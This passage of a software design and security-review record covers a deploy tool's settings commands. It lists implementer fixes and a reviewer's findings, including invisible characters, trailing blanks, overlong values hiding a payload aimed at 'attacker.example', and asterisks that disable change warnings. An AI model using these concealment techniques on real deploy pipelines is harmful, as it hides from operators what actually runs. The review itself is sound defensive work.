reviewer's and are unchanged. Each fix has tests that failed before it and pass after it; the
contracts carry "As built" notes for everything a person sees that changed. Nothing in the runner,
`packages/core` or any message format changed.

### S1. The settings commands look at the file a deploy would sign

**Change.** `settingsPlace(cwd, link)` in `settings/source.ts` decides the file by `chooseSource`,
the deploy's own rule, given the `zekno.json` `findProject` finds here or in a folder above. The
settings commands (`ops/settings.ts`) and the settings screen (`app/effects/settings.ts`, its
`settingsFor`) both use it; the screen's logic was moved there, not copied. The commands judge a
`zekno.json` without the keychain: it counts when `links.json` holds it byte for byte (it was
signed by the team and used in its folder on this machine). One not signed by the team, or not yet
used here, is left aside as the deploy leaves it; nothing is asked or recorded. When the rule picks
a settings file, that file is shown or changed, wherever it is, and named as the deploy names it
(CS9 and CS10 now take the file). When it picks a Compose file while a `zekno.app.json` lies here,
every command says SH3, reworded for a link here or above, and shows or changes nothing (status 1;
SH3 is no longer a note after shown settings). With both files and nothing that decides, IN6 is
said apart. `init` makes the file in this folder and warns with SH3 when the link in use names
another file.

In the review's three folders, as built:

- **A** (sub-folder under a linked root): every command reads and writes the root's file;
  `zekno settings` at a terminal starts `demo  from <the root's path>`; `set` without `--yes` says
  ``There is no terminal to ask on. Add `--yes` to write it to <the root's path>.``; the
  sub-folder's own file is untouched; `compose` prints the root's text, which `zekno deploy` there
  signs.
- **B** (link names `compose.yaml`, `zekno.app.json` beside it): `settings`, `--json`, `compose`,
  `set` and `unset` each print only
  `This folder's zekno.json names compose.yaml, so zekno deploy uses it, not the zekno.app.json here.`,
  status 1.
- **C** (link names `deploy/zekno.app.json`): every command reads and writes
  `deploy/zekno.app.json`, named so (`demo  from deploy/zekno.app.json`,
  `Write this to deploy/zekno.app.json? ...`); `compose` prints its text, which the deploy signs.

**Known limit.** The commands that never read the keychain take `links.json` as the sign of "used
here". A `zekno.json` recorded there whose signature no longer verifies (its signer was removed
from the team since) is followed by them, while `zekno deploy` leaves it aside: at a terminal it
says so (`... is not signed by your team, so zekno does not use it ...`) and asks for the server
and the app; with no terminal it stops. Attacker B can also add an entry to `links.json`, as
`accepted.ts` already notes. `zekno settings` itself, which reads the keychain for its marks, shows
no app and no marks in that case.

**Tests.** `test/scenarios/settings-which-file.test.ts` (A, B and C for every command, both files,
an unsigned `zekno.json` above and a signed one not used on this machine, with `links.json`
unchanged; `set`, `unset` and `compose` with a key store that throws);
`test/scenarios/settings-compose.test.ts` (printed equals signed, byte for byte, in A and C; in B
nothing printed and the deploy signs `compose.yaml`). All nine new tests failed on the code before
the fix. **Commit** `5d429d5`.

### S2. Invisible characters are refused

**Change.** One definition, `holdsHidden` in `server/sanitize.ts`, beside `sanitize` and built on
its own classes: a control character, every character `sanitize` takes out as invisible or drawn
as nothing (`\p{Cf}`, `\p{Zl}`, `\p{Zp}`, `\p{Cs}`, `\p{Default_Ignorable_Code_Point}`), and
U+FE0E or U+FE0F where it does not follow an `Extended_Pictographic` character. `settings/` may
import `server/` (both are base folders of the layering), so no exception was needed. The reader
refuses such a character in the start command (SV9, a new rule (g)) and in a plain value (SV24, a
second rule), naming the place and never the content:
`web, variables.plain.NODE_ENV: use no invisible character, such as a zero-width space or a right-to-left mark.`
`readTyped`, used by `zekno settings set` and the screen, refuses the same (CS7 with
`Use no invisible character, such as a zero-width space or a right-to-left mark.`). Every name and
every other value was already held to an ASCII pattern, which a test now checks for each kind.

**Where the line is.** Refused: zero-width spaces and joiners (U+200B to U+200D, U+2060), the soft
hyphen, the bidirectional marks, embeddings, overrides and isolates (U+200E, U+200F, U+061C,
U+202A to U+202E, U+2066 to U+2069), the invisible operators, tag characters (U+E0000 to U+E007F),
the Hangul fillers (U+115F, U+1160, U+3164, U+FFA0), variation selectors (U+FE00 to U+FE0F where
not after a pictograph, U+E0100 and on, the Mongolian ones), the combining grapheme joiner, U+180E,
the interlinear annotation and musical format characters, and as before every `Cc`, the byte order
mark, U+2028 and U+2029. Allowed: text in any script, precomposed accents, combining marks, emoji,
an emoji with its form selector, skin tones, flags, and spaces that draw as a space (U+00A0,
U+3000, U+2800). An emoji sequence joined by U+200D is refused.

**Combining marks: left as they are.** They draw something, so a value that holds them never reads
as the value without them, which is what S2 is about; the reader already bounds a string to 4,096
code points; and any bound on a run of them would be a guess at what real text needs (Vietnamese
written decomposed, Hebrew with points and cantillation, Tibetan stacks) and would refuse real
values. Whether a long run draws over the rows above in common terminals is still not validated.

**Tests.** `test/settings/invisible.test.ts`: each kind alone, after a word and inside one; the
review's own values (`production` U+200B, `true` U+E0001, `app.` U+00AD `example.com`, `on`
U+3164, `bun run start` U+2060); what stays allowed; the names held to ASCII; `readTyped`; and a
walk over every code point that `sanitize` takes out, each refused. Before the fix the review's
file read as settings and `readTyped` took `true` U+E0001 (run with the code before the fix).
Two tests changed (below). **Commit** `92039f2`.

### S3. What the next deploy removes is marked

**Change.** `rows.ts`: a plain variable or a volume this machine's last deploy had and the file no
longer has is a row of its own after the file's (`removed`, AS8), on the screen in place of the
`none` row, and in `zekno settings` at a terminal; a service it had is listed (`removedServices`);
`zekno settings` at a terminal also shows a setting no longer set that the deploy had, marked with
AS3 as the screen already did. Piped and `--json` carry no marks, as before.

Lines a person now sees, at a terminal (100 columns), for the review's case:

```text
  Deploy        memory    no limit  ! changed, not deployed (was 512m)
  Variables     plain     NODE_ENV=production
                          none  ! removed, not deployed (was REQUIRE_AUTH=1)
  Volumes       data      /data
                audit     none  ! removed, not deployed (was /var/audit; its data stays)

  auth  ! removed, not deployed (was ghcr.io/acme/auth:1)
```

On the screen (100 by 30 and 80 by 24) the same rows, and under the Services `auth`, faint, then
`! removed, not deployed` in the warning colour over two lines. `; its data stays` keeps a
volume's line from suggesting its data is deleted (FR-012).

**Tests.** `test/settings/rows.test.ts`, `test/ui/ink/settings-report.test.tsx` (the lines, their
colours, piped unchanged), `test/app/settings-screen.test.tsx` (100 by 30, 80 by 24, colours,
`enter` on a removed row), `test/app/settings-effects.test.ts`, `test/commands/settings.test.tsx`
(after a real deploy). **Commit** `a5af103`.

### S4. A long value says that it goes on

**Change.** `settings-layout.ts`, `rowValueLines`: a value of more than three lines is cut there,
followed by AS9, `… <n> more lines: c shows them in the Compose text`, faint, then the row's mark;
a mark's old value takes one line at most. The change box shows the old and the new value whole
when the pane holds them with five lines of rows, else each cut with AS9, and its question is
always drawn. The Compose text behind `c` already scrolled to its last line; a test now pins it.
For the review's start command: at 80 by 24 `… 80 more lines: c shows them in the Compose text`
then `! changed, not deployed (was bun run start)`; at 100 by 30 `… 52 more lines`; in the change
box at 80 by 24 one line of each value and `… 47 more lines: ...`.

**Tests.** `test/app/settings-screen.test.tsx`, "a long value": both sizes, a short value drawn
whole, the old value cut, `c` reaching `attacker.example` and the end, the change box whole and
cut. **Commit** `13cc897` (with S5).

### S5. `zekno.app.json` by its exact name

**Change.** `listsExactly(dir, name)` in `project/file.ts`, the check `zekno.json` already had,
now shared. `settingsFileIn` in `settings/source.ts` holds `chooseSource` (so the deploy, `zekno
link`, the app's `d` and the settings commands) to it, and `readSettingsFile` holds a file found in
a folder (this one, or the one a link names) to it. `init` says IN7 before any question when the
name is taken on this disk by a file of other letter case.

**Tests.** `test/scenarios/settings-exact-name.test.ts`, which says which kind of disk it ran on:
with only `ZEKNO.APP.JSON`, `chooseSource` gives the Compose file, the reader says SR1, every
settings command SH1, `zekno deploy` the Compose file's sentence and nothing runs, the screen SH1;
`Zekno.App.Json` beside `compose.yaml` is not both; a link naming `zekno.app.json` beside
`ZEKNO.APP.JSON` finds no such file; `init` says IN7 on a disk that ignores case and makes
`zekno.app.json` beside on one that heeds it. On this Mac (case-insensitive) before the fix,
`chooseSource` chose `ZEKNO.APP.JSON` as settings and read it. **Commit** `13cc897`.

### Needs validation: the screen's `d` (run, and fixed)

**What the test showed before the fix.** In a linked folder, the screen's read, then the file
changed (memory `1g` to `2g`), then the `deploy` effect: `deploy-started`, the stages,
`demo is live on dev`; the changed file was signed and started without being shown.

**Change.** `d` on the settings screen (rows or Compose text) carries `shown`, the SHA-256 of the
file the screen read. The app's deploy compares it with the bytes it reads (`readSource` now gives
a settings file's SHA-256); when they differ, or the file is no longer a settings file, nothing is
signed or sent, the status line says
`The settings changed since this screen showed them, so nothing was deployed.` (DP6), and the
screen reads the file again. `d` from the app's own screen carries nothing, as before.

**Tests.** `test/app/app-effects.test.ts`, "d on the settings screen deploys only the file it
showed" (changed: refused, nothing signed or connected; unchanged: deployed; the app's own `d`:
as before); `test/app/settings-state.test.ts` (`d` carries `shown`). **Commit** `ab85172`.

### Needs validation: `init` without hard links (run, and fixed)

**What the test showed before the fix.** With `link` failing with `ENOTSUP` and a file made at
`zekno.app.json` between the check and the rename, `createSettings` returned without an error and
the rename replaced that file.

**Change.** On a disk without hard links the file is made in place with
`O_CREAT | O_EXCL | O_NOFOLLOW`, which refuses any name taken at that moment, a link to nowhere
included (IN4), then written whole and flushed; a failure after it was made removes it only while
it is still the file made.

**Tests.** `test/settings/write.test.ts`: each of `ENOTSUP`, `EPERM`, `EOPNOTSUPP`, `EMLINK`,
`ENOSYS` makes the file whole, mode 644, with no temporary file left; a file or a link to nowhere
that appears before the placing is never replaced. **Commit** `ab85172`.

### Not validated

Still as part 2 records them: two names that differ only in letter case in one Git repository (S5
makes the result the same on every disk, but which one a macOS checkout keeps was not run);
`docker compose up` on a Linux server; how a long run of combining marks draws in common
terminals.

### Existing tests whose expectations changed

- `test/ops/settings.test.ts`, "a zekno.json in use here naming compose.yaml while zekno.app.json
  is here": SH3 is now the command's only sentence, not a note after the settings (S1).
  `settingsData` now returns `{ data, note }` and throws at once, so two calls of that file read
  `.data` and `toThrow` (S1).
- `test/ui/ink/settings-report.test.tsx`, the two tests of the report's note: the note is now IN6
  (the only note a report carries), not SH3 (S1).
- `test/settings/words.test.ts`: SH3's words, and CS9 and CS10 taking the file (S1).
- `test/commands/settings.test.tsx`: CS10 called with the file; the same words (S1).
- `test/settings/change.test.ts`, "a value is cleaned before it is shown": a value holding U+202E
  can no longer be set, so the settings are made in memory, and the refusal is checked (S2).
- `test/scenarios/settings-compose.test.ts`, "a plain value with an invisible character": the file
  is now refused, nothing printed (S2).
- `test/settings/rows.test.ts`, "a setting the last deploy had and the file no longer has is not
  shown": it is now shown and marked; and "plain variables and volumes, each by its name": a
  removed variable is a removed row, not a `none` row marked changed (S3).
- `test/settings/source.test.ts`, `readSource` of a settings file: it now gives the SHA-256 of the
  bytes read (the screen's `d`).
- `test/app/settings-state.test.ts`, `d` on the settings screen and in its Compose text: the effect
  carries `shown`; the app's own screen's `d` does not (the screen's `d`).

**Commit of these records and the docs**: the commit that adds this part.

### After the second pass (part 7): what was fixed

**Written by the implementer, after the reviewer's part 7.** Each fix has tests that failed before
it and pass after it.

#### S6. A `zekno.json` not yet in use here

**Change.** `linkOf` in `ops/settings.ts` gives the `zekno.json` that applies here as `inUse`
(in `links.json`) or, when it carries a signature and is not there, as `pending`. A pending one
that names another file than this folder's own `zekno.app.json` stops `zekno settings`, `--json`,
`compose`, `set` and `unset` with SH4, status 1, nothing shown or written:
`This folder's zekno.json names deploy/zekno.app.json and is not in use on this machine yet: zekno deploy asks about it first, and a yes deploys deploy/zekno.app.json, not the zekno.app.json here.`
(`The zekno.json in <folder> names ...` for one above). No keychain is read, nothing is asked or
recorded, `links.json` is unchanged. Naming the folder's own file, the commands go on. The
first-use question of single commands (`useQuestion`) names the file a yes deploys when it is not
`compose.yaml`: `Ada linked this folder to demo on dev, with deploy/zekno.app.json. Use it here?`.
Every existing test of features 004 and 006 asks about `compose.yaml` and kept its words.
`apps/cli/tests/link.e2e.ts` checks the app's question ("ada linked this folder to demo on prod"
as a region of the app's screen), which is unchanged; nothing under `apps/cli/tests/` was edited.

**Known limits.** The full-screen app's own first-use question (`useLinkWords`) still names no
file in this folder: the app's existing screens stay as they are in this feature. Without the
keychain the commands cannot tell the team's signature from another's, so any signature counts as
pending; a `zekno.json` signed by another team, which the deploy calls not signed and leaves aside,
also stops the commands with SH4 (they fail closed). `init` does not say SH4.

**Tests.** `test/scenarios/settings-which-file.test.ts`: folders C, B and A on a second machine of
the member (`twin`, a key store that throws), every command, SH4, the own file untouched,
`links.json` never written; the own file goes on; `zekno deploy`'s question names
`deploy/zekno.app.json` and a yes signs that file. Before the fix the commands printed the
folder's own file with status 0 and the question named no file. **Commit** `8814494`.

#### S7. Options the settings commands do not take

**Change.** `cli/cli.ts` refuses any option a settings command does not take (`--json` for
`zekno settings` and `--yes` for `set` and `unset` are theirs), after the words are checked:
`` `zekno settings compose` does not take `--app`. `` with the help line, status 2. No other
command's reading of its arguments changes (`plain-unchanged.test.ts` green). CS11 names the file
written when it is not this folder's own: `Written to deploy/zekno.app.json  Run zekno deploy to
use it.` **Tests.** `settings-which-file.test.ts`, "the options a settings command takes". The
reviewer's other half (`from <file>` on standard error for `compose`) was not done: not asked.
**Commit** `f39d118`.

#### S8. A blank at either end

**Change.** `blankAtAnEnd` in `settings/values.ts`: a plain value may not start or end with a
`White_Space` character or U+2800 (SV24's third rule), nor may the first or last word of a start
command (SV9 (h)): `use no space or other blank at its start or end.` `readTyped` refuses the same.
Blanks inside stay. **Where it differs from the request:** the ordinary spaces around a start
command's words stay allowed. They only separate the words and are never signed (the Compose text
holds the words), the approved grammar has `*SP` at both ends, and the contract's own example is
`  node   server.js  `; any other blank there would be part of a word and is refused.
**Tests.** `test/settings/invisible.test.ts`, "a blank at either end" (the review's ten blanks and
the space, at each end, in the file and typed; inner blanks kept). **Commit** `f39d118`.

#### S9. Asterisks in a value

**Change.** `inSettingsForm` in `project/compose-file.ts` holds a text to the exact lines
`composeText` writes, every name and value a double-quoted scalar at a node's start, so the text
holds no anchor, alias or tag; `aliasesTooMany` skips the alias count for such a text only.
`deployedSettings`, `expectedValues` and `composeServices` use it. Any other text keeps the count
unchanged (a hand-written file with the same 500 asterisks still gives no names).
**Tests.** `test/project/compose-file.test.ts` (500 asterisks: the form, `JWT_SECRET` named, the
services listed; hand-written unchanged; a line zekno does not write, or an alias, anchor, tag,
comment or other escape among its lines, is not the form; every good file's text is);
`test/settings/compose.test.ts` (the deployed settings read back, a removed variable and service
marked). **Commits** `f39d118`, and `4909f66` for its pattern written as the lint asks.

#### The walkthrough's type-ahead

**Change.** Keys carry the time they were read; a stage of a change records when it opened; a key
read within `TYPED_AHEAD_MS` (50 ms) of that, the same read included, does nothing (Ctrl-C still
quits). **Tests.** `test/app/settings-type-ahead.test.tsx` (the real app, a stand-in terminal:
`2g` and Enter in one read, `y` 3 ms later, nothing written; before the fix the file held `2g`),
`test/app/settings-state.test.ts`. `ta_timing.py` after the fix: no write at 3, 10 or 30 ms.
**Commit** `29e1e8e`.

#### Existing tests whose expectations changed in this pass

- `settings-which-file.test.ts`, "signed and not yet used here ...: the folder's own file": now
  SH4 (S6). Folder A's `set --yes`: `Written to <the root's file>` (S7). "Both files": IN6 a
  warning, on standard error (walkthrough).
- `values.test.ts`, `readTyped` of `"  as it is "`: now refused (S8); `test/support/settings-random.ts`
  puts a drawn plain value that would start or end with a blank between brackets, so the thousand
  settings stay within the rules (S8).
- `settings-state.test.ts` and `settings-screen.test.tsx`, AS7: without backticks (walkthrough).
- `settings-screen.test.tsx`, the change box at 80 by 24: cut around the difference, no key named
  (walkthrough).
- `commands/settings.test.tsx`, IN6 after `init`: a warning (walkthrough).

## 7. Second pass: the fixes

**Written by the same independent reviewer as parts 1 to 5**, not by the implementer. Parts 1 to 6
are unchanged.

### Scope and method

**Commits.** The six commits of `git log d6dbac0..HEAD`, ending at `2272197`: `5d429d5` (S1),
`92039f2` (S2), `a5af103` (S3), `13cc897` (S4, S5), `ab85172` (the two candidates), and `2272197`
(docs, read only for part 6). In `apps/cli/src`: 22 files, 883 lines added and 288 removed. Part 6
was read first. Then the code: `settings/source.ts`, `ops/settings.ts` and `commands/settings.ts`
in full; the diffs of `server/sanitize.ts`, `settings/values.ts`, `shape.ts`, `schema.ts`,
`rows.ts`, `file.ts`, `write.ts`, `words.ts`, `types.ts`, `project/file.ts`,
`app/effects/settings.ts`, `app/effects/deploys.ts`, `app/state/settings.ts`, `events.ts`,
`app/screens/settings-layout.ts`, `settings-change.tsx`; and, unchanged, `project/accepted.ts`
(`isAccepted`), `project/signed.ts` (`standingOf`), `project/project.ts` (`useQuestion`) and
`project/compose-file.ts` (`tooManyAliases`, `expectedValues`).

**Run**:

- Tests: `test/settings/` (now 15 files, `invisible.test.ts` new), `test/scenarios/settings-which-file.test.ts`,
  `settings-exact-name.test.ts` and `settings-compose.test.ts`: 526 pass.
  `test/app/settings-state.test.ts`, `settings-effects.test.ts`, `settings-screen.test.tsx`,
  `test/commands/settings.test.tsx`, `test/ops/settings.test.ts`,
  `test/ui/ink/settings-report.test.tsx`, `test/scenarios/settings-deploy.test.ts`: 162 pass.
  `test/app/app-effects.test.ts`, the three tests of "d on the settings screen deploys only the file
  it showed": pass.
- The probe of part 1 for S1 (folders A, B and C), run again on the fixed code.
- Five new throwaway probes, in a scratch folder outside the repository, with the in-memory key
  store, the local runner and the stand-in Docker: S1's folders on a second machine of the member
  (`twin`), where the team-signed `zekno.json` is not yet used; folder A deployed with `--app` and
  `--server`; a `zekno.json` edited after signing and recorded in `links.json` by hand (attacker
  B); a link above with a settings file in between; a link whose folder became a link out of the
  project; both files and no link; the keychain reads of `zekno settings` in a sub-folder; the
  settings commands given `--app`, `--server` and `-f`. Then the
  reader and `holdsHidden` on 35 characters; the marks after 13 kinds of change; the rows of long
  values; and a deployed text holding 500 asterisks.
- Not used: the system keychain, `ssh`, the network, a real terminal, `docker compose up`.

### What became of each item

| Item | State | Why |
|------|-------|-----|
| S1 | Closed in part | Where the `zekno.json` is in use here, A, B and C are closed: my probe of part 1, run again, finds the text printed equal to the text signed in A and C, and in B every command stops with SH3, status 1. Two ways remain: the first use of that `zekno.json` on a machine (S6) and a deploy with `--app` and `--server` (S7). |
| S2 | Closed in part | `holdsHidden` (`server/sanitize.ts:54`) refuses every `Cc`, `Cf`, `Zl`, `Zp`, `Cs` and `Default_Ignorable_Code_Point` character, and U+FE0E or U+FE0F not after a pictograph, in the start command (`values.ts:154`) and a plain value (`values.ts:296`), from the file and when typed (`readTyped`). Every other value and every name is held to an ASCII pattern. A blank at either end of a plain value still draws as nothing (S8). |
| S3 | Closed | Removed plain variables, volumes and services have rows (`rows.ts:155`, `:285`), and settings no longer set keep theirs at a terminal. Probe: removing one secret, every secret, `publish`, the port, `start`, `restart` or `cpus`, renaming a service and renaming a volume are each marked, in `zekno settings` and on the screen. Reordering services or plain variables is not marked and changes nothing Compose does. The marks can all be turned off by S9. |
| S4 | Closed | A row's value is cut after 3 lines with AS9, "… n more lines: c shows them in the Compose text" (`settings-layout.ts:192`), and so is the change box. Probe: 1,500 spaces before a payload do not hide it (the wrap drops the spaces and draws the payload); 1,500 NBSP draw 3 lines and AS9. |
| S5 | Closed | `settingsFileIn` (`source.ts:67`) and the reader (`file.ts:119`, `:145`) count only an entry listed exactly as `zekno.app.json`; `init` says IN7. The folders of a link's path are still found in any letter case on such a disk, as for a Compose file a link names (read, not run; older than this feature). |
| The screen's `d` | Closed | The rows, the Compose text and the SHA-256 come from one read (`app/effects/settings.ts`, `outcomeOf`), stored in one state change; `d` carries that SHA-256 (`app/state/settings.ts:71`), and the deploy refuses other bytes, or no settings file, before anything is signed (`app/effects/deploys.ts:266`). After a change written from the screen, the old SHA-256 stays until the file is read again, so a `d` in between is refused (DP6), never deployed unseen. The only gap is the time between a read reaching the state and its frame being drawn. Before the first read, `d` carries nothing and deploys as the app screen's `d` does, with nothing shown. |
| `init` without hard links | Closed | `createInPlace` (`write.ts:231`) opens with `O_CREAT | O_EXCL | O_NOFOLLOW`, so no name taken at that moment, a link to nowhere included, is replaced; `write.test.ts` makes `link` fail with each of the five codes. |

**The implementer's two doubts about S1.**

- *A `zekno.json` in `links.json` whose signer has since left the team.* The settings commands
  follow it (`ops/settings.ts:85`, `isAccepted`); `zekno deploy` says it is not signed by the team
  and, with no terminal, stops (status 2), or at a terminal leaves it aside, asks for the server and
  the app, and deploys this folder's own file. The printed and the signed text then differ, but
  only after the deploy said so. `zekno settings` itself, which opens the team, knows the
  standing is not `used` and still shows that file, without saying the deploy will not use it.
  Nobody gains anything from this: removing a member is the team's own act.
- *Attacker B writing `links.json`.* Probe: a `zekno.json` edited after it was signed, with its new
  bytes added to `links.json` by hand. `zekno settings compose` follows it; `zekno deploy` stops with
  status 2 and "... is not signed by your team, so zekno does not use it." B gains a disagreement
  that the deploy itself reports. B could already mark a team-signed copy as used (feature 004,
  "Left"), which makes both commands follow it; that is unchanged.

**Other folders tried.** A link above, with a settings file in a folder between it and the folder
the commands run in: both commands use the link's file. A link whose folder was replaced by a link
out of the project: both stop with SR9. Both files and no link: `compose` prints the settings' text
and IN6 on standard error, status 0; the deploy says DP2, status 2. Each as it should be.

### New findings

| Id | Severity | Finding | Confirmed |
|----|----------|---------|-----------|
| S6 | Medium | On a machine where the team-signed `zekno.json` is not used yet, the settings commands show this folder's own file, and the deploy, after a question that names no file, signs the one the `zekno.json` names | Yes, by a probe |
| S7 | Low | The settings commands follow a deploy with no flags, and take `--app`, `--server` and `-f` without using them; `zekno deploy --app <other> --server <name>` under a used link signs this folder's own file | Yes, by a probe |
| S8 | Low | A blank at either end of a plain value is drawn as nothing and is signed | Yes, by a probe |
| S9 | Low | 400 asterisks in a value turn off every mark and the question for missing values | Yes, by a probe |

#### S6. On first use, the settings commands show another file than the deploy signs (Medium)

**Why medium**: it is S1's own scenario on a fresh clone, which is how a branch is often checked
out for review: the command meant to show what will run prints another text, and the deploy signs
the link's file after a question that does not say which file that is.

**Where**: `ops/settings.ts:85-90` (`linkInUse`) keeps a `zekno.json` only when `links.json` holds
it, and otherwise falls back, silently, to this folder's own files (`settingsPlace` with no link,
`source.ts:122`). `zekno deploy` at a terminal asks the first-use question
(`project/project.ts:101-116`, `useQuestion`): in this folder it reads
`<member> linked this folder to <app> on <server>. Use it here?`, naming no file, and a yes uses
the link's file (rule 2 of `chooseSource`).

**Who**: whoever can change the files of a branch of the team's repository whose `zekno.json`
names another file than this folder's `zekno.app.json`: `compose.yaml`, as every folder linked
before this feature does (B), or `deploy/zekno.app.json` (C). No key is needed. The victim is a
member on a machine where that `zekno.json` was never used: a fresh clone, a second computer.

**Steps** (probe, `twin` of the member, same team, no `links.json`):

- **C.** `zekno settings compose` prints `ghcr.io/acme/visible:1` (this folder's own), status 0.
  `zekno deploy` at a terminal asks `Ada linked this folder to demo on dev. Use it here?`; yes; the
  history holds the signed text of `ghcr.io/acme/hidden:1` (`deploy/zekno.app.json`).
- **B.** `zekno settings compose` prints the settings' text and, on standard error, IN6: "This
  folder has compose.yaml too. zekno deploy asks which to deploy, or takes -f <file>." The deploy
  does not ask which: it asks the same `Use it here?`, then a value for `GREETING`, and signs
  `compose.yaml`. A deploy from a Compose file has no `from` row, so nothing on the screen names it.

With no terminal the deploy stops on such a `zekno.json` (feature 004, S2), so the disagreement needs
the question at a terminal.

**Smallest fix**: in `linkInUse`, when `findProject` finds a `zekno.json` that `links.json` does
not hold and the file it names is not the one the commands would show, stop with a sentence that
names both (no keychain is needed to say it): "zekno.json here names compose.yaml. It is not in use
on this machine yet: zekno deploy asks about it, and a yes deploys compose.yaml. Run zekno link
first to answer that." Also let the first-use question name the file a yes deploys, in this folder
too, as K2 made it do for a folder above.

#### S7. The settings commands follow only a deploy with no flags (Low)

**Why low**: the person typed `--app` and `--server` and knows the deploy goes elsewhere; but the
commands they would read first show, and change, another file, and say nothing of it in plain
output.

**Where**: the settings commands do not use `--app`, `--server` or `-f`, so `settingsPlace` always
gets the link that applies. Worse, they accept them and say nothing: `cli/cli.ts` parses these
flags for every command, and nothing refuses them for `settings`. `zekno deploy --app <other>
--server <name>` gives the link's file only to the link's own app (feature 004, P2), so
`chooseSource` then reads this folder's own file.

**Who**: nobody needs to act; a repository with several apps does it. An author of a branch can use
it as in S1.

**Steps** (probe): folder A (root linked to `demo`, `sub/zekno.app.json` of its own). In `sub`,
`zekno settings compose` prints the root's text (`ghcr.io/acme/root:1`);
`zekno deploy --app billing --server dev` prints `Deploy 1 of billing is running on dev ...` and
signs `sub/zekno.app.json` (`ghcr.io/acme/sub:1`). In the same folder,
`zekno settings set web.memory 2g --yes` writes the root's file, and its plain output,
`web · memory limit  no limit → 2g` and `Written  Run zekno deploy to use it.`, names no file. Before
the fixes it wrote `sub/zekno.app.json`, the file that `billing` deploy signs.

The same flags given to the settings commands change nothing, with status 0 and nothing on standard
error: `zekno settings compose --app billing --server dev` and `zekno settings compose -f
zekno.app.json` both print the root's text, `zekno settings --app billing` the root's lines, and
`zekno settings set web.memory 2g --yes --app billing --server dev` writes the root's file (probe).
A person who types the deploy's own flags to see what it signs is shown another app's text.
Ignoring the flags is older than the fixes (part 1 missed it); the fixes made it point at the other
file.

**Smallest fix**: refuse `--app`, `--server` and `-f` on the settings commands (status 2), as words
after a command are refused, until they are given the deploy's own meaning. And name the file in
plain output of `compose`, `set` and `unset` (on standard error, "from <file>") and in CS11
("Written to <file>").

#### S8. A blank at either end of a plain value is drawn as nothing (Low)

**Why low**: the attack of S2 still works with a blank: a value that reads as `true` is another
value in the container.

**Where**: `holdsHidden` (`server/sanitize.ts:54`) takes characters that draw as a blank, and
`plainValueProblem` (`values.ts:296`) allows them anywhere, at either end too. The rows, the piped
lines and the change box draw the value as it is, so a blank at its end is not seen.

**Steps** (probe): `REQUIRE_AUTH` = `true` followed by one of U+0020, U+00A0, U+1680, U+2000 to
U+200A, U+202F, U+205F, U+3000 or U+2800 (braille blank). The reader takes each; `readTyped` takes
`true ` too. Piped `zekno settings` prints `web	variables.plain.REQUIRE_AUTH	true ` and the row
reads `REQUIRE_AUTH=true `, with the mark `(was REQUIRE_AUTH=true)` beside it when the last deploy
had `true`. Only the Compose text (between quotes) and `--json` show the blank.

**Smallest fix**: refuse a plain value that starts or ends with a `White_Space` character or
U+2800, or draw such a value between quotes, as an empty one is already drawn `""`.

#### S9. Four hundred asterisks turn off the marks and the question for missing values (Low)

**Why low**: it needs one deployed change carrying the asterisks, or a secret the person never set;
then marks silently go, and an app can start with an empty secret without being asked for it.

**Where**: `tooManyAliases` (`project/compose-file.ts:58-72`) counts every `*` followed by any
character but a few as a YAML alias, inside quotes too. The Compose text made from settings never
holds an alias: every `*` is inside a double-quoted scalar. Yet `deployedSettings`
(`settings/compose.ts:185`) gives up past 200 of them, and `expectedValues` gives no names
(`asking/first-deploy.ts:405`; the app's `d`, `app/effects/deploys.ts:311`).

**Steps** (probe, the functions called directly): a last deploy whose plain `MASK` is 500
asterisks and which had `REQUIRE_AUTH=1`; the file now without `REQUIRE_AUTH`.
`deployedSettings` of that deploy's text gives undefined, so no row is marked or removed, and no
service is listed as removed. `expectedValues` of a text with secret `JWT_SECRET` and the same
`MASK` gives `[]`; without the asterisks it gives `["JWT_SECRET"]`. So a deploy at a terminal does
not ask for a value that was never set, and the app starts with `JWT_SECRET` empty. Two asterisks
are counted as one alias, so 402 or more are needed; a value may hold 4,096 characters.

**Smallest fix**: in `deployedSettings`, read the text by the lines `composeText` writes instead of
with a YAML parser, or count aliases outside double-quoted scalars only; for a settings deploy,
take the names to ask for from the settings' own `secrets`, not from `expectedValues`.

### What the fixes opened

- **The keychain.** `zekno settings` in a sub-folder of a linked folder now opens the team, once,
  to verify the link for its marks (probe: one read). Before, it read no keychain there, since only a
  `zekno.json` in the folder itself counted. One read per command in a linked folder is the rule of
  feature 004 (K10). `set`, `unset`, `--json`, `compose` and `init` still read none (probe, and the
  implementer's tests with a key store that throws).
- **Writes.** `set` and `unset` now write the file a link names, which can be in a folder above, or
  in another folder below the link's (`deploy/`). That is the point of the fix; S7 is where it
  writes a file the person did not expect, and does not name it.
- **Servers.** None of the settings commands connects (read in the code; the implementer's tests
  replace `connect` with one that throws).
- **A `zekno.json` that cannot be read**, in this folder or any above up to the home folder, now
  stops every settings command, as it stops a deploy with no flags. Before, `zekno settings` left
  it aside and the other commands never looked. That fails closed.
- **The screen** now takes its file from `settingsPlace`, shared with the commands. Where the link
  in use names a Compose file in a folder above, its sentence SH2 names that file by its path from
  the folder the app runs in, where it named the link's `compose` field before. No test draws that
  case; it changes words only.

### Missing tests

- S6 and S7 as above, once fixed: a second machine (`twin`) in folders B and C, the first-use
  question answered yes; folder A with `--app` and `--server`.
- S8: a plain value ending in each blank of the list above.
- S9: a settings deploy with 500 asterisks in a value: the marks against it, and the question for a
  secret never set.
- The removed-signer case: `zekno settings` should say that the deploy will not use the link it
  follows (it knows the standing).

### Judgement

The fixes close what they set out to close, S3, S4, S5 and both candidates fully, S1 and S2 for the
cases the first pass reported, and they open nothing that reads the keychain, connects or writes
where it should not. No way was found, in either pass, to make the Compose text mean more than the
settings show, or to deploy without a question at a terminal.

The feature is fit to merge into `dev` once S6 is fixed. S6 is S1 again, on a fresh clone, and its
fix needs no keychain and touches only `linkInUse` and the first-use question's words. Refusing the
flags the settings commands ignore (the first half of S7's fix) is a few lines and is worth doing
with it. The rest of S7, and S8 and S9, are low: they can be fixed after the merge, or recorded as
known limits with the tests above.
